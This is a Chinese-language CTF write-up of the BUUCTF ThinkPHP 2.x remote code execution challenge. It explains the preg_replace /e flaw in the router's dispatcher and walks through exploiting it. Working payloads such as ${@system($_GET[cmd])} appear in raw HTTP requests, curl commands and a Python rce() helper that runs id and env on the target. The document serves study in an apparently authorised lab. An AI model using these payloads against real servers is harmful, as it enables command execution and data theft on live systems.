---
title: BUUCTF - Web - ThinkPHP 2-Rce
date: 2026-11-14 18:24:00
categories:
  - CTF
  - BUUCTF
  - Web
tags:
  - preg_replace的e修饰符
  - 代码执行
  - ThinkPHP2.x路由
  - 环境变量FLAG
cover: /img/cover/anime-characters-collage.jpg
description: BUUCTF 真实漏洞题 ThinkPHP 2 远程代码执行，环境为旧版框架。分发器用带可执行修饰符的正则做变量替换，替换串被当作代码求值，构造特定语法即可执行命令；改用请求参数传命令规避引号转义，最终读环境变量答案。
keywords:
  - ThinkPHP2
  - 2-Rce
  - preg_replace /e
  - 代码执行
  - 路由分发
ai: >-
  本题是 ThinkPHP 2 的经典远程代码执行复现，环境为旧版框架与 PHP 5.5。漏洞根因在路由分发器使用带可执行修饰符的正则做变量替换，该修饰符会让替换内容被当作代码求值。由于路由参数会经过这次替换，攻击者把系统命令语法放进路径即可被执行并回显输出，而这一修饰符到 PHP 7 才移除，所以此链成立。利用上直接内联带引号的命令会因编码转义触发解析错误，需改用请求参数传递命令。先用信息函数验证代码执行，再读环境变量，发现答案并不落在文件而是注入在环境变量里，最终拿到脱敏后的 flag，平台提交通过并加分。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | BUUCTF（真实漏洞复现，源标注 Real） |
| 方向 | Web |
| 难度 | Easy |
| 分值 | 1 |
| 环境 | 授权靶场（已脱敏） |
| 靶机 | ThinkPHP 2.1（PHP 5.5.38，Apache） |
| 参考 | vulhub 仓库 `thinkphp/2-rce`（公开 PoC 复现环境） |

> 练习场、题目及提交相关的实例标识已按要求删除；靶场统一记为「授权靶场（已脱敏）」。

## 信息收集

- 首页返回 ThinkPHP 示例页（`Hello,ThinkPHP`），底部标识 `ThinkPHP 2.1`。
- 由此确认框架版本为 2.x、运行时为 PHP 5.5，命中 `preg_replace` `/e` 修饰符仍然可用的版本区间（该修饰符在 PHP 7.0 才被移除）。

## 漏洞分析

### 漏洞原理

ThinkPHP 2.x 的 URL 分发器 `ThinkPHP/Lib/Think/Util/Dispatcher.class.php` 中使用 `preg_replace` 配合 `/e` 修饰符对路由参数做模板变量替换：

```php
// Dispatcher.class.php (约 102 行)
$var = preg_replace("/\{(\w+)\}/e", "\$var['\\1']", $var);
```

`/e` 修饰符会让 `preg_replace` 把替换内容作为 **PHP 代码执行**（`eval`）。当路由参数 `name` 的值被拼入模板变量时，攻击者构造的 `${@system(...)}` 会被当作 PHP 代码执行，从而实现任意代码执行。

> PHP 5.5 的 `preg_replace` 仍支持 `/e` 修饰符（该修饰符在 PHP 7.0 才被移除），本题环境为 PHP 5.5.38。

### 关键触发点

路由参数会经过一次变量名替换。当 URL 为：

```http
GET /index.php/Index/Index/name/${@system('id')} HTTP/1.1
Host: target:8080
```

时，`name` 参数的值 `${@system('id')}` 会被 `preg_replace` 的 `/e` 执行，`@system('id')` 的结果（命令输出）会回显到页面。

## 利用过程

### 1. 确认环境

首页返回 ThinkPHP 示例页（`Hello,ThinkPHP`），底部标识 `ThinkPHP 2.1`。

### 2. 验证代码执行（phpinfo）

```http
GET /index.php/Index/Index/name/${@phpinfo()} HTTP/1.1
Host: target:8080
```

返回 85136 字节的 phpinfo 页面，确认 `/e` 修饰符代码执行成功。

### 3. 命令执行

直接内联 `system('id')` 时，单引号会被 URL 编码后转义破坏，导致 `Parse error`（`$var['name']="${@system(\'id\')}";`）。

改用 **`$_GET` 参数传递命令**，避免路径内引号转义：

```http
GET /index.php/Index/Index/name/${@system($_GET[cmd])}?cmd=id HTTP/1.1
Host: target:8080
```

其中 `${@system($_GET[cmd])}` 需 URL 编码。命令 `id` 通过 `cmd` GET 参数传入，返回：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4. 读取 flag

flag 存储在**环境变量 `FLAG`** 中（非文件），通过 `env` 命令直接读取：

```http
GET /index.php/Index/Index/name/${@system($_GET[cmd])}?cmd=env HTTP/1.1
Host: target:8080
```

输出包含 `FLAG=flag{xxxx}`（真实值已脱敏）。

## 完整 EXP

本题 `payload_abs` 为空；源 wp 提及同目录 `payload.py`（Python 复现脚本），以下为核心 payload 说明与等价请求：

```bash
# 1. 验证代码执行：phpinfo
curl "http://target:8080/index.php/Index/Index/name/\${@phpinfo()}"

# 2. 命令执行：把命令放进 cmd GET 参数，避开路径内单引号转义
#    ${@system($_GET[cmd])} 整体需 URL 编码后放入路径
curl "http://target:8080/index.php/Index/Index/name/\${@system(\$_GET[cmd])}?cmd=id"

# 3. 读 flag：env 输出环境变量 FLAG
curl "http://target:8080/index.php/Index/Index/name/\${@system(\$_GET[cmd])}?cmd=env"
```

```python
# 核心 payload 说明（源自 payload.py 思路）
import urllib.request, urllib.parse

HOST = "http://target:8080"  # 授权靶场（已脱敏）

def rce(cmd):
    # ${@system($_GET[cmd])} 整串 URL 编码进路径，命令单独由 cmd 参数传入
    inject = urllib.parse.quote("${@system($_GET[cmd])}")
    url = f"{HOST}/index.php/Index/Index/name/{inject}?cmd={urllib.parse.quote(cmd)}"
    return urllib.request.urlopen(url, timeout=20).read().decode("utf-8", "ignore")

print(rce("id"))
print(rce("env"))  # 输出里含 FLAG=flag{xxxx}
```

核心 payload 要点：

1. **URL 编码**：`${@system($_GET[cmd])}` 整个字符串需要 URL 编码后放入路径。
2. **命令通过 `cmd` GET 参数**传递，命令本身再单独 URL 编码，避免单引号/特殊字符被路径转义破坏。
3. **命令输出回显**：`system()` 的输出会直接回显在页面顶部（ThinkPHP 错误页之前）。

## Flag

`flag{xxxx}`（真实值已脱敏）。flag 在环境变量 `FLAG` 中，用 `env` 命令读取。平台提交结果：accepted，+1 分（相关实例标识已删除）。

## 踩坑与总结

- 版本是关键：`/e` 修饰符只在 PHP < 7.0 可用，先确认首页 `ThinkPHP 2.1` 标识再动手。
- 路径里内联带单引号的命令会因 URL 编码 / 转义触发 `Parse error`，务必改用 `$_GET[cmd]` 外带命令。
- flag 优先想到环境变量而非 `/flag` 文件：本题 `env` 一步到位。
- `system()` 输出直接回显在页面顶部，不需要 webshell 或额外回显通道。
- 真实漏洞复现的价值在于理解「框架路由替换 + 危险修饰符 = 代码执行」这一通用模式。

> 仅记录授权靶场环境下的研究；复现脚本思路来自本地 WP 归档，实例 ID 与真实 flag 已脱敏。
